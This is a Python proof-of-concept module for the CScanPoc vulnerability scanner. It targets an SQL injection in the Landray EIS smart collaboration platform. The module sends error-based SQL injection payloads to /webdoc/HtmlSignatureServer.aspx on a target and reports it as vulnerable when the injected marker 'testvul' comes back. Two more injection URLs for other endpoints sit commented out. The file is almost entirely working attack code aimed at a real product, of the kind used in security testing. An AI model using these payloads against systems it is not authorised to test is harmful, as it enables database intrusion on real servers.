# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Landray_0003'  # 平台漏洞编号，留空
    name = '蓝凌EIS智慧协同平台 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = 'Unknown'  # 漏洞公布时间
    desc = '''
        蓝凌EIS智慧协同平台功能涵盖协同管理、知识管理、文化管理、个人工作及移动办公、项目管理、资源管理等多项扩展应用，充分满足成长型企业的各项需求。
        /webdoc/HtmlSignatureServer.aspx，参数处理不当，导致SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '蓝凌EIS智慧协同平台'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'd684e3bd-ead5-470d-a9e5-97b5325ac038'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-22'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            arg = self.target
            payloads = [
                # "/sm/menu_define.aspx?id=1%20and%201=(select+%27test%27%2b%27vul%27)",
                # "/webdoc/file_download.aspx?guid=19e789719ac343679c070110c147290e'%20and%201=CONVERT(int,%27test%27%2b%27vul%27)--",
                "/webdoc/HtmlSignatureServer.aspx?DocumentID=1'%20and%201=CONVERT(int,%27test%27%2b%27vul%27)--&SignatureID=1&Signature=1&COMMAND=SHOWSIGNATURE"
            ]
            for payload in payloads:
                code, _, res, _, _ = hh.http(arg + payload)
                if 'testvul' in res:
                    # security_hole(arg+payload)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
